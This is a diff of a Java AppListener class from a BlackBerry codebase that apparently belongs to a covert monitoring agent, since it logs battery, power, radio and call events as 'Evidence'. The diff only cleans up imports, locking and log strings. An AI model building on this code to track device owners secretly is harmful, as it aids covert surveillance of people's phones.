@@ -10,11 +10,8 @@
 
 package blackberry;
 
-import java.util.Hashtable;
 import java.util.Vector;
 
-import net.rim.blackberry.api.phone.Phone;
-import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.blackberry.api.phone.phonelogs.CallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
@@ -25,9 +22,7 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.HolsterListener;
 import net.rim.device.api.system.RadioStatusListener;
 import net.rim.device.api.system.RuntimeStore;
-import net.rim.device.api.system.SystemListener;
 import net.rim.device.api.system.SystemListener2;
-import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -36,10 +31,9 @@ import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.CallListObserver;
-import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The listener interface for receiving app events. The class that is interested
  * in processing a app event implements this interface, and the object created
@@ -51,7 +45,7 @@ import blackberry.interfaces.Singleton;
  * @see AppEvent
  */
 public final class AppListener extends Listener implements RadioStatusListener,
-        HolsterListener, SystemListener, SystemListener2, PhoneListener,
+        HolsterListener, SystemListener2, PhoneListener,
         PhoneLogListener, Singleton {
 
     private static final long GUID = 0x4e5dd52b9f50b3feL;
@@ -68,7 +62,6 @@ public final class AppListener extends Listener implements RadioStatusListener,
     Vector callListObservers = new Vector();
 
     Task task;
-
     //private Timer applicationTimer;
 
     static AppListener instance;
@@ -79,8 +72,6 @@ public final class AppListener extends Listener implements RadioStatusListener,
     private AppListener() {
         lastStatus = DeviceInfo.getBatteryStatus();
         task = Task.getInstance();
-
-        //ScreenFake.Push();
     }
 
     /**
@@ -122,12 +113,12 @@ public final class AppListener extends Listener implements RadioStatusListener,
         removeObserver(applicationObservers, observer);
     }
 
-    public synchronized void addBacklightObserver(
+    public  void addBacklightObserver(
             final BacklightObserver observer) {
         addObserver(backlightObservers, observer);
     }
 
-    public synchronized void removeBacklightObserver(
+    public  void removeBacklightObserver(
             final BacklightObserver observer) {
         removeObserver(backlightObservers, observer);
     }
@@ -170,7 +161,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("batteryGood");
         //#endif
 
-        Evidence.info("Battery Good");
+        Evidence.info("Battery good");
     }
 
     /*
@@ -182,7 +173,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("batteryLow");
         //#endif
 
-        Evidence.info("Battery Low");
+        Evidence.info("Battery low");
     }
 
     /*
@@ -362,7 +353,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
      * @see net.rim.device.api.system.SystemListener#powerOff()
      */
     public void powerOff() {
-        Evidence.info("Power Off");
+        Evidence.info("Power off");
         //#ifdef DEBUG
         debug.info("Power Off");
         //#endif
@@ -373,7 +364,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
      * @see net.rim.device.api.system.SystemListener#powerUp()
      */
     public void powerUp() {
-        Evidence.info("Power Up");
+        Evidence.info("Power up");
         //#ifdef DEBUG
         debug.info("Power Up");
         //#endif
@@ -388,7 +379,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("radioTurnedOff");
         //#endif
 
-        Evidence.info("Radio Turned Off");
+        Evidence.info("Radio turned off");
     }
 
     /*
@@ -481,7 +472,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("powerOffRequested: " + reason);
         //#endif
 
-        Evidence.info("Power Off Requested");
+        Evidence.info("Power off requested");
 
     }
 
@@ -818,53 +809,43 @@ public final class AppListener extends Listener implements RadioStatusListener,
     /******************** Phone *******************/
 
     public void callAdded(int callId) {
-        // TODO Auto-generated method stub
-        
+ 
     }
 
     public void callAnswered(int callId) {
-        // TODO Auto-generated method stub
-        
+  
     }
 
     public void callConferenceCallEstablished(int callId) {
-        // TODO Auto-generated method stub
-        
+   
     }
 
     public void callConnected(int callId) {
-        // TODO Auto-generated method stub
-        
+
     }
 
     public void callDirectConnectConnected(int callId) {
-        // TODO Auto-generated method stub
-        
+
     }
 
     public void callDirectConnectDisconnected(int callId) {
-        // TODO Auto-generated method stub
-        
+ 
     }
 
     public void callDisconnected(int callId) {
-        // TODO Auto-generated method stub
-        
+ 
     }
 
     public void callEndedByUser(int callId) {
-        // TODO Auto-generated method stub
-        
+
     }
 
     public void callFailed(int callId, int reason) {
-        // TODO Auto-generated method stub
-        
+  
     }
 
     public void callHeld(int callId) {
-        // TODO Auto-generated method stub
-        
+
     }
 
     public void callIncoming(int callId) {
@@ -875,28 +856,23 @@ public final class AppListener extends Listener implements RadioStatusListener,
     }
 
     public void callInitiated(int callid) {
-        // TODO Auto-generated method stub
-        
+  
     }
 
     public void callRemoved(int callId) {
-        // TODO Auto-generated method stub
-        
+    
     }
 
     public void callResumed(int callId) {
-        // TODO Auto-generated method stub
-        
+  
     }
 
     public void callWaiting(int callid) {
-        // TODO Auto-generated method stub
-        
+ 
     }
 
     public void conferenceCallDisconnected(int callId) {
-        // TODO Auto-generated method stub
-        
+   
     }
 
 }
